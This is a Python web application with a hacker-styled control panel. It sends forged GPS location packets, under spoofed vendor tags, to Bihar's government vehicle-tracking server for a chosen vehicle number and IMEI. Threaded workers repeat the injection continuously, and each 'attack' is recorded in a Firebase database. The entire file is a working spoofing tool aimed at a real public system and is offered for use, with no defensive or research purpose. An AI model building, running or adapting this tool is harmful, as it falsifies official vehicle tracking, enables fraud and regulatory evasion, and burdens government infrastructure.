import socket
import threading
import time
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
import firebase_admin
from firebase_admin import credentials, db

app = FastAPI()

# --- FIREBASE SETUP ---
# Project: ghop-ghop-gps-injection
# Key file: serviceAccountKey.json
try:
    cred = credentials.Certificate("serviceAccountKey.json")
    firebase_admin.initialize_app(cred, {'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/'})
except Exception as e: print(f"FB Error: {e}")

# --- GLOBAL VARIABLES ---
firing = False
total_sent = 0
logs = []
TARGET_IP, TARGET_PORT = "vlts.bihar.gov.in", 9999
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

def format_coord(val):
    p = str(val).split('.')
    return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"

# --- DATABASE LOGIC (YOUR POINTS) ---

def record_attack_data(vno, imei, lat, lon):
    """Save/Update records in Data_Records before attack"""
    ref = db.reference(f'Data_Records/{vno}')
    ref.update({
        'Vehicle_No': vno,
        'IMEI_No': imei,
        'Lat': lat,
        'Lon': lon,
        'Status': 'Active',
        'Start_Time': (datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
    })

# --- ENGINE LOGIC (LOCKED - NO CHANGES) ---
def handshake_worker(tag_list, imei, vno, lat, lon):
    global firing, total_sent, logs
    while firing:
        for tag in tag_list:
            if not firing: break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(7)
                s.connect((TARGET_IP, TARGET_PORT))
                now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
                pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{format_coord(lat)},N,{format_coord(lon)},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
                s.sendall(bytes(pkt, 'ascii'))
                total_sent += 1
                s.close()
                logs.append(f"[{tm}] {tag} -> TURBO_OK")
                if len(logs) > 8: logs.pop(0)
                time.sleep(0.1)
            except: time.sleep(1)

# --- API ENDPOINTS ---

@app.get("/fetch_vehicle")
def fetch_vehicle(vno: str):
    """Point: Check if vehicle exists and fetch IMEI + Location"""
    ref = db.reference(f'Data_Records/{vno.upper()}')
    data = ref.get()
    if data:
        return {
            "exists": True,
            "imei": data.get('IMEI_No', ''),
            "lat": data.get('Lat', ''),
            "lon": data.get('Lon', '')
        }
    return {"exists": False}

@app.get("/init")
def init(v:str, i:str, lt:str, ln:str):
    global firing, total_sent; 
    if not firing:
        firing=True; total_sent=0
        # Point: Record attack in DB before starting
        record_attack_data(v.upper(), i, lt, ln)
        chunks = [TAGS[x:x+5] for x in range(0, len(TAGS), 5)]
        for c in chunks:
            threading.Thread(target=handshake_worker, args=(c, i, v.upper(), lt, ln), daemon=True).start()
    return {"ok":True}

@app.get("/stop")
def stop(): 
    global firing; firing=False; return {"ok":True}

@app.get("/status")
def status(): 
    return {"c": total_sent, "l": logs}

# --- GUI WITH AUTO-FETCH & RESET LOGIC (CLEAN) ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head><title>NITRO V82 PRO | CLEAN INTERFACE</title><style>
    body { background:#000; color:#0f0; font-family:'Courier New', monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    .box { width:420px; border:1px solid #0f0; padding:25px; box-shadow:0 0 25px rgba(0, 255, 0, 0.4); background:rgba(0,10,0,0.95); border-radius:15px; }
    h2 { text-align:center; letter-spacing:5px; margin-bottom:20px; border-bottom:1px solid #0f0; padding-bottom:15px; text-shadow:0 0 10px #0f0; }
    
    .input-group { margin-bottom: 12px; }
    label { font-size:12px; color:#0f0; text-transform:uppercase; margin-bottom:3px; display:block; text-shadow:0 0 5px #0f0; }
    
    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:12px; outline:none; font-size:14px; box-sizing:border-box; }
    input:focus { border-color: #0f0; box-shadow: 0 0 10px rgba(0, 255, 0, 0.5); }
    
    .btn-row { display:flex; gap:10px; margin-top:20px; }
    button { flex:1; padding:15px; font-weight:bold; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; text-transform:uppercase; transition:0.3s; }
    button:hover { background:#0f0; color:#000; box-shadow:0 0 15px #0f0; }
    
    #log { height:180px; background:#001100; border:1px dotted #030; margin-top:20px; padding:12px; font-size:12px; overflow:hidden; color:#00ff41; font-family:monospace; }
    
    .notif { font-size:10px; color:#aaa; margin-top:5px; min-height:14px; }
    .stats-bar { display:flex; justify-content:space-between; margin-top:15px; font-weight:bold; font-size:14px; color:#fff; }
    
    .blink { animation: blinker 1s linear infinite; }
    @keyframes blinker { 50% { opacity: 0; } }
    
    /* Emergency Reset Styling */
    .reset-btn { border-color: #ffcc00 !important; color: #ffcc00 !important; font-size:11px; padding:8px; width:45%; margin: 10px auto; display:block; }
    .reset-btn:hover { background:#ffcc00 !important; color:#000 !important; box-shadow:0 0 15px #ffcc00 !important; }
    </style></head><body>
    <div class="box">
        <h2>NITRO V82 TURBO</h2>
        
        <div class="input-group">
            <label>> VEHICLE_ID (REG NO)</label>
            <input type="text" id="v" placeholder="e.g. BR01X1234" onblur="checkVehicle()">
            <div id="v_status" class="notif">ENTER VNO TO FETCH DATA...</div>
        </div>
        
        <div class="input-group">
            <label>> IMEI_SERIAL (15 DIGITS)</label>
            <input type="text" id="i" placeholder="e.g. 35898010XXXXXXX">
        </div>
        
        <div style="display:flex; gap:10px;" class="input-group">
            <div style="flex: 1;">
                <label>> LATITUDE</label>
                <input type="text" id="lt" placeholder="e.g. 25.6123456">
            </div>
            <div style="flex: 1;">
                <label>> LONGITUDE</label>
                <input type="text" id="ln" placeholder="e.g. 84.7123456">
            </div>
        </div>
        
        <div class="btn-row">
            <button onclick="st()">INITIATE TURBO ATTACK</button>
            <button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT ATTACK</button>
        </div>
        
        <button onclick="resetSystem()" class="reset-btn">[SYSTEM RESET / CLEAR]</button>
        
        <div id="log">SYSTEM STATUS: READY_TO_INJECT...</div>
        
        <div class="stats-bar">
            <span>PACKETS: <span id="c">0</span></span>
            <span id="st" style="color:#0f0">IDLE</span>
        </div>
    </div>
    <script>
        let itv;
        function checkVehicle() {
            let vno = document.getElementById('v').value.trim();
            if(vno.length > 4) {
                fetch(`/fetch_vehicle?vno=${vno}`)
                .then(r => r.json())
                .then(data => {
                    if(data.exists) {
                        document.getElementById('i').value = data.imei;
                        document.getElementById('lt').value = data.lat;
                        document.getElementById('ln').value = data.lon;
                        document.getElementById('v_status').innerText = "RECORD FOUND! DATA LOADED.";
                        document.getElementById('v_status').style.color = "#0f0";
                        document.getElementById('v_status').style.textShadow = "0 0 5px #0f0";
                    } else {
                        document.getElementById('v_status').innerText = "NEW VEHICLE. ENTER DETAILS.";
                        document.getElementById('v_status').style.color = "#aaa";
                    }
                });
            }
        }
        function st() {
            fetch(`/init?v=${document.getElementById('v').value.trim()}&i=${document.getElementById('i').value.trim()}&lt=${document.getElementById('lt').value.trim()}&ln=${document.getElementById('ln').value.trim()}`);
            document.getElementById('st').innerText = "RUNNING";
            document.getElementById('st').style.color = "#fff";
            document.getElementById('st').className = "blink";
            if(!itv) itv = setInterval(() => {
                fetch('/status').then(r=>r.json()).then(d=>{ 
                    document.getElementById('c').innerText = d.c; 
                    document.getElementById('log').innerHTML = d.l.join("<br>"); 
                });
            }, 1000);
        }
        function sp() { 
            fetch('/stop'); 
            document.getElementById('st').innerText = "STOPPED"; 
            document.getElementById('st').style.color = "#f00";
            document.getElementById('st').className = ""; 
            clearInterval(itv); itv=null; 
        }
        
        // System Reset Function
        function resetSystem() {
            // Clear inputs
            document.getElementById('v').value = "";
            document.getElementById('i').value = "";
            document.getElementById('lt').value = "";
            document.getElementById('ln').value = "";
            
            // Clear statuses
            document.getElementById('v_status').innerText = "ENTER VNO TO FETCH DATA...";
            document.getElementById('v_status').style.color = "#aaa";
            document.getElementById('v_status').style.textShadow = "none";
            document.getElementById('c').innerText = "0";
            document.getElementById('log').innerHTML = "SYSTEM RESET COMPLETE. READY FOR NEW ENTRY.";
            
            // Stop polling if active
            if(itv) { clearInterval(itv); itv=null; }
            document.getElementById('st').innerText = "IDLE";
            document.getElementById('st').style.color = "#0f0";
            document.getElementById('st').className = "";
        }
    </script></body></html>
    """
